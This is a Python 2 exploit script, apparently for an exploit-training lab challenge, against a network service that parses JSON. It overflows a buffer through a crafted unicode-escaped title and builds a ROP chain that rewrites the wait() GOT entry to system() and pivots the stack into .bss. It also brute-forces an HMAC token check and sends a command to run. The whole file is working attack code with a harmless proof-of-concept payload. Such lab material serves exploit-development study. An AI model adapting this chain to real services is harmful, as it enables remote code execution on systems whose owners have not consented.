from socket import *
import hmac
from hashlib import sha1
import json
from struct import pack

# Server Configuration
SERVER_IP = "172.16.190.128"
SERVER_PORT = 20003

# Static address on server
BSS_ADDRESS = 0x804BDC0  # .bss section
WAIT_GOT = 0x0804BD30

# Command to run using system
COMMAND = "/bin/touch /tmp/1337"


def rop_memcpy(dest, src, len):
    rop_mem  = pack("<I", 0x08048E60) # memcpy static address (from import list)
    rop_mem += pack("<I", 0x0804964d) # pop ebx ; pop esi ; pop edi ; ret -> each pop increament esp by 4 (move esp as needed for the return)
    rop_mem += pack("<I", dest)  # argument 1 for memcpy
    rop_mem += pack("<I", src)  # argument 2 for memcpy
    rop_mem += "\\\u0" + str(len) + "00\\\u0000"   # argument 3 for memcpy
                                                    #  using unicode because of NULL byte
    return rop_mem


def build_rop_chain():
    rop_chain  = "A" * 127 + "\\\\u" + "C" * 31
    rop_chain += pack("<I", BSS_ADDRESS - 0x4)  # ebp to load after return from decode_string -> it's 4 bytes so the next 4 bytes will run over EIP
                                        # this is the first step for the stack pivoting

    # --- overwrite GOT - change wait to system ---
    rop_chain += pack("<I", 0x08048bf0)  # pop ebx ; ret
    rop_chain += pack("<I", (WAIT_GOT - 0x5d5b04c4) & 0xffffffff)  # in order to receive the correct value after the future "add" command (add [ebx + 0x5d5b04c4]...etc)
    rop_chain += pack("<I", 0x08049b4f)  # pop eax ; add esp, 0x5c ; ret
    rop_chain += pack("<I", 0xFFFA1BD0)     # wait - system -> 0xb75bcb20 - 0xb761af50 = (-) 0x0005E430 = 0xFFFA1BD0
    rop_chain += "A" * 0x5C # in order to keep consistant with the location of esp
    rop_chain += pack("<I", 0x080493fe)  # add [ebx + 0x5d5b04c4], eax; ret


    rop_chain += rop_memcpy(BSS_ADDRESS, WAIT_GOT, 4) # wait GOT entry (now points to system)
    rop_chain += rop_memcpy(BSS_ADDRESS + 8, 0x0804BDF4, 4) # gContents global variable

    rop_chain += pack("<I", 0x08049431)  # leave ; ret

    return rop_chain


def valid_request(token, rop_chain):
        hash_ok = False
        i = 0
        json_template = '{ "tags":["qqqq", "wwww"], "title":"' + rop_chain
        json_template += '", "contents":"' + COMMAND + '", "serverip":"127.0.0.1", "count":'
        while not hash_ok:
            json_template += str(i) + '}'
            request = token + '\n' +  json_template
            hmac_object = hmac.new(token, request, sha1)
            hmac_digest = hmac_object.hexdigest()
            # print hmac_digest
            i += 1
            first_two_bytes = hmac_digest[0:4]
            if first_two_bytes == "0000":
                print '[+] valid request at the ' + str(i) + ' try!'
                hash_ok = True

        return request


def main():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))

    print '[+] Connected to Server - ' + SERVER_IP + ':' + str(SERVER_PORT)

    token = s.recv(1024)[1:-2]

    print '[+] Token : ' + token

    rop_chain = build_rop_chain()
    request = valid_request(token, rop_chain)

    s.send(request)
    print '[+] 0ff w3 g0!'

if __name__ == "__main__":
    main()
